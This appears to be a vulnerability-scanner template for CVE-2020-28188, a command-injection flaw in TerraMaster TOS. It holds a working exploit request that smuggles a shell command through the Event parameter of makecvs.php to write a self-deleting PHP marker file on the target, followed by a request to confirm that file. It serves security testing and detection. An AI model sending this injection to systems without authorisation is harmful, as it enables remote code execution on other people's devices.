id: yaml-poc-terra_master-tos-unauthorized_access-CVE-2020-28188
info:
  name: Yaml Poc Terra_Master Tos Unauthorized_Access Cve 2020 28188
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-terra_master-tos-unauthorized_access-CVE-2020-28188'
  tags: unauth,cve
  classification:
    cve-id: CVE-2020-28188
  reference:
  - http://packetstormsecurity.com/files/172880/TerraMaster-TOS-4.2.06-Remote-Code-Execution.html
  - https://nvd.nist.gov/vuln/detail/CVE-2020-28188
  - https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/
  - https://www.huawei.com/cn/psirt/security-notices/huawei-sn-20210120-01-liferay-cn
  - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
http:
- method: GET
  path:
  - /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r2}}.php%20&&%20chmod%20755%20/usr/www/{{r2}}.php||
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /{{r2}}.php
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
